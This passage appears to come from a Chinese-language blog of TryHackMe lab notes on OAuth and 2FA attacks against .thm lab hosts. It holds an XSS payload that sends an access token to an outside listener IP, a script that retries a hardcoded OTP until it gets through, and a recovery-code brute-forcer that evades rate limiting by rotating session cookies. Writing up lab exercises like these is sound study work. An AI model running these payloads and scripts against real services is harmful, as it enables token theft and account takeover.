)</span><br></pre></td></tr></table></figure>

<p>直接访问（这一步模拟操控uri）<code>http://coffee.thm:8000/o/authorize/?response_type=code&amp;client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&amp;redirect_uri=http://coffee.thm:8000/oauthdemo/callbackforcsrf/</code><br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608175547.png"><br>构造的恶意网页与正常网页没什么区别<br>登录然后授权就会接收到这样的响应<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608175707.png"><br>然后记下授权码，之后换用户登录，点击同步联系人的按钮<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608181557.png"><br>再点击认证按钮<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608181636.png"><br>到最后填授权码的那个数据包，更换授权码<code>1taRIhPhOBJbGHoZQUAdgB4fMJcyh8</code><br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608181720.png"><br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608181754.png"></p>
<h3 id="隐式授权-1"><a href="#隐式授权-1" class="headerlink" title="隐式授权"></a>隐式授权</h3><h4 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h4><ol>
<li><strong>在 URL 中公开访问令牌</strong> ： 应用程序将用户重定向到 OAuth 授权端点，该端点在 URL 片段中返回访问令牌。页面上运行的任何脚本都可以轻松访问此片段。</li>
<li><strong>重定向 URI 验证不足</strong> ： OAuth 服务器未充分验证重定向 URI，从而允许潜在攻击者纵重定向端点。</li>
<li><strong>无 HTTPS 实施</strong> ：应用程序不强制执行 HTTPS，这可能导致通过中间人攻击进行令牌拦截。</li>
<li><strong>访问令牌处理不当</strong> ： 应用程序不安全地将访问令牌存储在 <code>localStorage</code> 或 <code>sessionStorage</code> 中 ，使其容易受到 XSS 攻击。</li>
</ol>
<h4 id="实操-xss攻击"><a href="#实操-xss攻击" class="headerlink" title="实操(xss攻击)"></a>实操(xss攻击)</h4><p>点击同步状态按钮，客户端应用程序配置为使用<strong>隐式授权类型</strong><br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608183556.png"><br>授权 URL 的构造如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var client_id = &#x27;npmL7WDiRoOvjZoGSDiJhU2ViodTdygjW8rdabt7&#x27;; </span><br><span class="line">var redirect_uri = &#x27;http://factbook.thm:8080/callback.php&#x27;; </span><br><span class="line">var auth_url = &quot;http://coffee.thm:8000/o/authorize/&quot;; </span><br><span class="line">var url = auth_url + &quot;?response_type=token&amp;client_id=&quot; + client_id + &quot;&amp;redirect_uri=&quot; + encodeURIComponent(redirect_uri); window.location.href = url;</span><br></pre></td></tr></table></figure>

<p>登录跳转后注意到，<code>#</code>将访问令牌与 OAuth 2.0 隐式授权流 URL 分开<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608185605.png"><br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608185751.png"><br>触发漏洞点<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608190540.png"><br>起一个python服务器，构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;new Image().src=&#x27;http://10.21.170.43:404/?token=&#x27;+window.location.hash.split(&#x27;&amp;&#x27;)[0].split(&#x27;=&#x27;)[1];&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608193843.png"><br>然后根据提示访问对应url，输入token<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608194032.png"></p>
<h1 id="多因素身份验证"><a href="#多因素身份验证" class="headerlink" title="多因素身份验证"></a>多因素身份验证</h1><h2 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h2><ol>
<li>弱 OTP 生成算法</li>
<li>应用程序泄露 2FA 令牌</li>
</ol>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="OTP-泄漏"><a href="#OTP-泄漏" class="headerlink" title="OTP 泄漏"></a>OTP 泄漏</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>XHR （XMLHttpRequest） 响应中的 OTP 泄漏通常是由于 2FA（双因素身份验证）机制实施不佳或不安全的编码而发生的</p>
<h4 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h4><p>登录后yakit看记录，直接拿到验证码<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608205455.png"></p>
<h3 id="逻辑缺陷或不安全的编码"><a href="#逻辑缺陷或不安全的编码" class="headerlink" title="逻辑缺陷或不安全的编码"></a>逻辑缺陷或不安全的编码</h3><p>登录后卡在这<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608205910.png"><br>yakit抓包也没看到有直接泄露OTP<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608205945.png"><br>直接访问我们要访问控制面板<code>/dashboard</code>，<code>http://mfa.thm/labs/second/dashboard</code>，突破了2fa封锁<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608210417.png"></p>
<h3 id="绕过自动注销功能"><a href="#绕过自动注销功能" class="headerlink" title="绕过自动注销功能"></a>绕过自动注销功能</h3><p>最好的利用方式就是写exp自动化攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># --- 常量与设置 ---</span><br><span class="line"></span><br><span class="line"># 定义登录、2FA 验证和仪表板的 URL</span><br><span class="line">LOGIN_URL = &#x27;http://mfa.thm/labs/third/&#x27;</span><br><span class="line">OTP_URL = &#x27;http://mfa.thm/labs/third/mfa&#x27;</span><br><span class="line">DASHBOARD_URL = &#x27;http://mfa.thm/labs/third/dashboard&#x27;</span><br><span class="line"></span><br><span class="line"># 定义登录凭证</span><br><span class="line">CREDENTIALS = &#123;</span><br><span class="line">    &#x27;email&#x27;: &#x27;thm@mail.thm&#x27;,</span><br><span class="line">    &#x27;password&#x27;: &#x27;test123&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 定义 headers 以模拟真实浏览器行为</span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0&#x27;,</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;,</span><br><span class="line">    &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.5&#x27;,</span><br><span class="line">    &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span><br><span class="line">    &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,</span><br><span class="line">    &#x27;Origin&#x27;: &#x27;http://mfa.thm&#x27;,</span><br><span class="line">    &#x27;Connection&#x27;: &#x27;close&#x27;,</span><br><span class="line">    &#x27;Referer&#x27;: &#x27;http://mfa.thm/labs/third/mfa&#x27;,</span><br><span class="line">    &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># --- 辅助函数 ---</span><br><span class="line"></span><br><span class="line">def is_login_successful(response):</span><br><span class="line">    &quot;&quot;&quot;检查响应是否包含成功登录的页面&quot;&quot;&quot;</span><br><span class="line">    return &quot;User Verification&quot; in response.text and response.status_code == 200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def is_login_page(response):</span><br><span class="line">    &quot;&quot;&quot;检查响应是否为登录页面&quot;&quot;&quot;</span><br><span class="line">    return &quot;Sign in to your account&quot; in response.text or &quot;Login&quot; in response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># --- 核心逻辑函数 ---</span><br><span class="line"></span><br><span class="line">def login(session):</span><br><span class="line">    &quot;&quot;&quot;处理登录流程&quot;&quot;&quot;</span><br><span class="line">    response = session.post(LOGIN_URL, data=CREDENTIALS, headers=HEADERS)</span><br><span class="line">    return response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def submit_otp(session, otp):</span><br><span class="line">    &quot;&quot;&quot;处理 2FA 验证流程&quot;&quot;&quot;</span><br><span class="line">    # 将 OTP 分割成单个数字</span><br><span class="line">    otp_data = &#123;</span><br><span class="line">        &#x27;code-1&#x27;: otp[0],</span><br><span class="line">        &#x27;code-2&#x27;: otp[1],</span><br><span class="line">        &#x27;code-3&#x27;: otp[2],</span><br><span class="line">        &#x27;code-4&#x27;: otp[3]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = session.post(OTP_URL, data=otp_data, headers=HEADERS, allow_redirects=False)</span><br><span class="line">    print(f&quot;调试：OTP 提交后的响应状态码: &#123;response.status_code&#125;&quot;)</span><br><span class="line">    return response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def try_until_success():</span><br><span class="line">    &quot;&quot;&quot;尝试登录并提交写死的 OTP，直到成功为止&quot;&quot;&quot;</span><br><span class="line">    otp_str = &#x27;1337&#x27;  # 写死的 OTP</span><br><span class="line"></span><br><span class="line">    while True:  # 持续尝试直到成功</span><br><span class="line">        session = requests.Session()  # 为每次尝试创建新的 session 对象</span><br><span class="line">        login_response = login(session)  # 在每次 OTP 尝试前先登录</span><br><span class="line"></span><br><span class="line">        if is_login_successful(login_response):</span><br><span class="line">            print(&quot;成功登录，准备提交 OTP。&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;登录失败，重试中...&quot;)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        print(f&quot;正在尝试 OTP: &#123;otp_str&#125;&quot;)</span><br><span class="line">        response = submit_otp(session, otp_str)</span><br><span class="line"></span><br><span class="line">        # 检查响应是否为登录页面 (表示 OTP 失败)</span><br><span class="line">        if is_login_page(response):</span><br><span class="line">            print(f&quot;OTP 尝试失败，被重定向到登录页。 OTP: &#123;otp_str&#125;&quot;)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        # 检查响应是否为重定向 (状态码 302)</span><br><span class="line">        if response.status_code == 302:</span><br><span class="line">            location_header = response.headers.get(&#x27;Location&#x27;, &#x27;&#x27;)</span><br><span class="line">            print(f&quot;Session cookies: &#123;session.cookies.get_dict()&#125;&quot;)</span><br><span class="line"></span><br><span class="line">            # 检查是否成功绕过 2FA 并到达仪表板</span><br><span class="line">            if location_header == &#x27;/labs/third/dashboard&#x27;:</span><br><span class="line">                print(f&quot;成功使用 OTP: &#123;otp_str&#125; 绕过 2FA！&quot;)</span><br><span class="line">                return session.cookies.get_dict()  # 成功后返回 session cookies</span><br><span class="line">            elif location_header == &#x27;/labs/third/&#x27;:</span><br><span class="line">                print(f&quot;OTP 尝试失败，被重定向到登录页。 OTP: &#123;otp_str&#125;&quot;)</span><br><span class="line">            else:</span><br><span class="line">                print(f&quot;非预期的重定向位置: &#123;location_header&#125;。 OTP: &#123;otp_str&#125;&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;收到非预期的状态码 &#123;response.status_code&#125;，重试中...&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># --- 主程序入口 ---</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    print(&quot;开始攻击，尝试绕过 2FA...&quot;)</span><br><span class="line">    try_until_success()</span><br><span class="line">    print(&quot;攻击结束。&quot;)</span><br></pre></td></tr></table></figure>

<p>花了快两分钟才成功<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608213930.png"><br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608213951.png"><br>然后用这个session替换，然后刷新网站</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d1re2l3nf1s1aan43ms1lst7ds</span><br></pre></td></tr></table></figure>

<p><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608214112.png"></p>
<h2 id="工具使用：evilginx"><a href="#工具使用：evilginx" class="headerlink" title="工具使用：evilginx"></a>工具使用：evilginx</h2><h1 id="综合测试"><a href="#综合测试" class="headerlink" title="综合测试"></a>综合测试</h1><h2 id="绕过2fa登录"><a href="#绕过2fa登录" class="headerlink" title="绕过2fa登录"></a>绕过2fa登录</h2><p>麻住了，直接访问80显示拒绝连接，想着看看开了啥端口，怎么都没有<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609112220.png"><br>扫10000范围看看，有结果了，1337开了服务<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609112905.png"><br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609113002.png"><br>扫目录发现这些，但都没怎么利用上<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609114250.png"><br>注意到登录页源码有一句目录命令要求<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609114331.png"><br>先给字典加个前缀</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#x27;s/^/hmr_/&#x27; ~/fuzzDicts-master/directoryDicts/dicc.txt &gt; ~/fuzzDicts-master/directoryDicts/dicc_hmr.txt</span><br></pre></td></tr></table></figure>

<p>然后dirsearch指定目录开扫</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dirsearch.py  -u http://10.10.182.222:1337 -w ~/fuzzDicts-master/directoryDicts/dicc_hmr.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609115102.png"><br>目测<code>/hmr_logs/</code>有用，访问看到里面有个错误日志<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609115522.png"><br>有个id序列<code>pid 12354:tid 139999999999990</code>，还有个邮件名<code>tester@hammer.thm</code>，邮件名可用于密码重置，先试试，时限180s内要输入四位验证码<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609133831.png"><br>没找到验证码泄露，逻辑漏洞也没有，真不会了，看wp学一下<br>先抓包看看<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609133808.png"><br>多次发包发现，当响应中的<code>Rate-Limit-Pending</code>字段的值为0的时候会触发速率限制<br><img src="/../../../images/Web_Application_Pentesting/1e0bf364a614ee8f611e8c8ee1fe90a5.png"><br>删除cookie以后发包发现，速率限制最大值是9，但这样是失败的，却能获取新cookie<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609134141.png"><br>之后重新抓包测试，发现单个cookie允许的发送次数是8次（7递减到0），之后就要重新获取cookie，然后输入邮箱，再来爆破<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609135825.png"><br>大致的逻辑有了，交给ai来写代码<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609142048.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># --- 配置区域 ---</span><br><span class="line"></span><br><span class="line"># 目标服务器的 URL</span><br><span class="line">TARGET_URL = &quot;http://10.10.182.222:1337/reset_password.php&quot;</span><br><span class="line"></span><br><span class="line"># 用于获取 Cookie 的邮箱地址</span><br><span class="line">EMAIL = &quot;tester@hammer.thm&quot;</span><br><span class="line"></span><br><span class="line"># 模拟浏览器的请求头</span><br><span class="line"># 这些是从您提供的数据包中提取的，以确保请求尽可能逼真</span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    &quot;Host&quot;: &quot;10.10.182.222:1337&quot;,</span><br><span class="line">    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36&quot;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,</span><br><span class="line">    &quot;Referer&quot;: TARGET_URL,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">    &quot;Cache-Control&quot;: &quot;max-age=0&quot;,</span><br><span class="line">    &quot;Origin&quot;: &quot;http://10.10.182.222:1337&quot;,</span><br><span class="line">    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># --- 函数定义 ---</span><br><span class="line"></span><br><span class="line">def get_new_session_cookie():</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    通过提交邮箱来请求一个新的会话 Cookie (PHPSESSID)。</span><br><span class="line">    </span><br><span class="line">    Returns:</span><br><span class="line">        str: 获取到的 PHPSESSID 值，如果失败则返回 None。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        print(&quot;\n[*] 正在请求新的 PHPSESSID...&quot;)</span><br><span class="line">        email_data = &#123;&quot;email&quot;: EMAIL&#125;</span><br><span class="line">        # 发送 POST 请求，并且不允许自动重定向，因为 Cookie 在 302 响应头中</span><br><span class="line">        response = requests.post(TARGET_URL, headers=HEADERS, data=email_data, allow_redirects=False, timeout=5)</span><br><span class="line">        </span><br><span class="line">        # 检查响应状态码是否为 302 (重定向) 并且响应中是否包含 Cookie</span><br><span class="line">        if response.status_code == 302 and &#x27;PHPSESSID&#x27; in response.cookies:</span><br><span class="line">            phpsessid = response.cookies[&#x27;PHPSESSID&#x27;]</span><br><span class="line">            print(f&quot;[+] 成功获取新的 Cookie: &#123;phpsessid&#125;&quot;)</span><br><span class="line">            return phpsessid</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;[!] 获取 Cookie 失败。状态码: &#123;response.status_code&#125;&quot;)</span><br><span class="line">            print(f&quot;    响应内容: &#123;response.text&#125;&quot;)</span><br><span class="line">            return None</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        print(f&quot;[!] 获取 Cookie 时发生网络错误: &#123;e&#125;&quot;)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">def run_brute_force(start_code=0):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    执行验证码爆破的主函数。</span><br><span class="line">    </span><br><span class="line">    Args:</span><br><span class="line">        start_code (int): 从哪个验证码开始尝试，默认为 0。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    phpsessid = get_new_session_cookie()</span><br><span class="line">    if not phpsessid:</span><br><span class="line">        print(&quot;[!] 无法开始爆破，因为初始 Cookie 获取失败。&quot;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 当前 Cookie 的尝试次数计数器</span><br><span class="line">    attempts_with_current_cookie = 0</span><br><span class="line"></span><br><span class="line">    # 循环遍历所有可能的四位验证码 (0000-9999)</span><br><span class="line">    for code_num in range(start_code, 10000):</span><br><span class="line">        # 检查当前 Cookie 的使用次数是否已达上限 (8次)</span><br><span class="line">        if attempts_with_current_cookie &gt;= 8:</span><br><span class="line">            phpsessid = get_new_session_cookie()</span><br><span class="line">            if not phpsessid:</span><br><span class="line">                print(&quot;[!] 无法继续爆破，因为更新 Cookie 失败。&quot;)</span><br><span class="line">                return</span><br><span class="line">            # 重置计数器</span><br><span class="line">            attempts_with_current_cookie = 0</span><br><span class="line">        </span><br><span class="line">        # 将数字格式化为四位字符串 (例如: 5 -&gt; &quot;0005&quot;)</span><br><span class="line">        recovery_code = f&quot;&#123;code_num:04d&#125;&quot;</span><br><span class="line"></span><br><span class="line">        # 准备爆破请求的数据和 Cookie</span><br><span class="line">        post_data = &#123;</span><br><span class="line">            &quot;recovery_code&quot;: recovery_code,</span><br><span class="line">            &quot;s&quot;: &quot;180&quot;  # 根据提供的数据包，这个值是180</span><br><span class="line">        &#125;</span><br><span class="line">        cookies = &#123;&quot;PHPSESSID&quot;: phpsessid&#125;</span><br><span class="line"></span><br><span class="line">        print(f&quot;[*] [尝试次数: &#123;attempts_with_current_cookie + 1&#125;/8] 正在尝试验证码: &#123;recovery_code&#125; ...&quot;, end=&#x27;\r&#x27;)</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            # 发送爆破请求</span><br><span class="line">            response = requests.post(TARGET_URL, headers=HEADERS, data=post_data, cookies=cookies, timeout=2) # 缩短超时以快速失败</span><br><span class="line"></span><br><span class="line">            # 增加当前 Cookie 的尝试次数</span><br><span class="line">            attempts_with_current_cookie += 1</span><br><span class="line">            </span><br><span class="line">            # 检查响应中是否包含失败信息</span><br><span class="line">            if &quot;Invalid or expired recovery code!&quot; not in response.text:</span><br><span class="line">                print(&quot;\n&quot; + &quot;=&quot;*50)</span><br><span class="line">                print(f&quot;[SUCCESS] 爆破成功！找到验证码: &#123;recovery_code&#125;&quot;)</span><br><span class="line">                print(f&quot;    使用的 Cookie: &#123;phpsessid&#125;&quot;)</span><br><span class="line">                print(&quot;=&quot;*50)</span><br><span class="line">                print(&quot;\n[+] 服务器成功响应内容:&quot;)</span><br><span class="line">                print(response.text)</span><br><span class="line">                return # 成功找到，结束程序</span><br><span class="line">            </span><br><span class="line">            # ---- 新增调试代码 ----</span><br><span class="line">            # 在每轮8次尝试的最后一次，打印调试信息</span><br><span class="line">            if attempts_with_current_cookie == 8:</span><br><span class="line">                # 使用\n换行，避免覆盖最后一次尝试的打印信息</span><br><span class="line">                print(f&quot;\n[DEBUG] Cookie &#123;phpsessid&#125; 的第 8 次尝试完成。&quot;)</span><br><span class="line">                # .strip() 用于移除响应内容前后多余的空白符</span><br><span class="line">                print(f&quot;        响应内容: &#123;response.text.strip()&#125;&quot;)</span><br><span class="line">            # ---- 调试代码结束 ----</span><br><span class="line"></span><br><span class="line">        except requests.exceptions.RequestException as e:</span><br><span class="line">            print(f&quot;\n[!] 尝试验证码 &#123;recovery_code&#125; 时发生网络错误: &#123;e&#125;&quot;)</span><br><span class="line">            print(&quot;[*] 强制在下一次尝试时更新 Cookie。&quot;)</span><br><span class="line">            # 设置一个特殊值，确保下次循环会触发 Cookie 更新</span><br><span class="line">            attempts_with_current_cookie = 8</span><br><span class="line"></span><br><span class="line">    print(&quot;\n[INFO] 所有 10000 个验证码已尝试完毕，未找到正确结果。&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># --- 主程序入口 ---</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # 您可以在这里修改 start_code 的值来从指定位置继续爆破</span><br><span class="line">    # 例如，如果上次脚本中断在 1234，您可以设置 start_code = 1235</span><br><span class="line">    run_brute_force(start_code=0)</span><br></pre></td></tr></table></figure>

<p>爆出来了<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609144727.png"><br>然后直接替换cookie刷新页面就行<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609144915.png"><br>然后修改密码成功登录<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609144952.png"></p>
